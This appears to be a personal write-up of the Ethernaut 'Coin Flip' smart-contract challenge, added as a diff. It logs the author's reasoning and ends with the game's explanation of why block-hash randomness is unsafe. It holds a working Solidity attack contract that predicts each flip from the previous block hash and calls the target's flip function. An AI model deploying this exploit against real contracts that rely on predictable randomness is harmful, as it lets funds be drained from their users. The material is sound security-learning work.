@@ -1,0 +1,113 @@
+Coin Flip
+Difficulty 3/10
+
+This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
+
+  Things that might help
+
+See the Help page above, section "Beyond the console"
+
+
+22033 01:24 KST
+sounds more like
+'manipulate the contract to intentionally control the coin flip result'
+okay, told meto look at help
+
+Ah, so they want me to deploy a smart contract to attack the code here. okay
+
+So I guess I need to calculate the 
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+block value 
+
+Let's see what I get if I hash current blocknumber-1
+Block number is retrieved by:
+
+var blockNumber = web3.eth.blockNumber;
+Block hash is retrieved by:
+
+var blockHash = web3.eth.getBlock(blockNumber).hash;
+
+
+
+220303 02:30 KST
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity ^0.6.0;
+
+So I deployed this smart contract below to Rinkeby
+
+contract CheckBlockValue {
+
+    function retrieve() public view returns (uint256){
+     uint256 blockValue = uint256(blockhash(block.number - 1));
+     return blockValue;
+    }
+}
+
+and got 
+114183716338162556401866378023685862466917406924324274862776632492743238548446
+as blockValue.
+I devided this by the factor
+57896044618658097711785492504343953926634992332820282019728792003956564819968
+and I got 
+1.9722196410869266
+
+hm... does safeMath division work differntly from javascript division?
+I know that solidity can't really deal with decimals.
+    bool side = coinFlip == 1 ? true : false;
+if coinFlip was
+1.9722196410869266
+would it just give false? then wouldn't this damn thing keep giving me false?
+Should I attack the contract so that the coinFlip will always be 1?
+
+220303 02:42 KST
+Wouldn't this always be false..?
+
+well, I just 
+  var result = contract.flip(0);
+then checked consecutiveWins;
+the number keeps growing.
+
+hm...then the number went back to 0.
+
+fuck it. I will just write a smart contract as below and press calculate function// SPDX-License-Identifier: GPL-3.0
+and fuck safeMath
+
+pragma solidity ^0.6.0;
+
+
+contract CheckBlockValue {
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  address target = 0x794418Ff1456847bC8E2990DF6C4902D65F99c3A;
+    function retrieve() public view returns (uint256){
+     uint256 blockValue = uint256(blockhash(block.number - 1));
+     return blockValue;
+    }
+
+    function calculate() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        if (coinFlip == 1) {
+            (bool success, ) = target.call(abi.encodeWithSignature("flip(bool)", true));
+            require(success, "tx failed");
+        } else {
+            (bool success, ) = target.call(abi.encodeWithSignature("flip(bool)", false));
+            require(success, "tx failed");
+        }
+    }
+}
+
+press calculate function every like 15 seconds.
+
+yep, solved it.
+
+Coin Flip
+Level completed!
+Difficulty 3/10
+
+Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.
+
+To get cryptographically proven random numbers, you can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.
+
+Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).
+
